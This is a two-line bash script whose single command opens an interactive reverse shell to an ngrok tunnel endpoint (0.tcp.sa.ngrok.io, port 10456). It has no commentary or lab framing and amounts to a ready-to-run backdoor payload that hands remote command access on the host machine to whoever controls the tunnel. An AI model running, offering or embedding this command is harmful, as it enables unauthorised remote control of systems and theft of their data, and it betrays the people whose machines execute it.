#!/bin/bash
bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/10456 0>&1
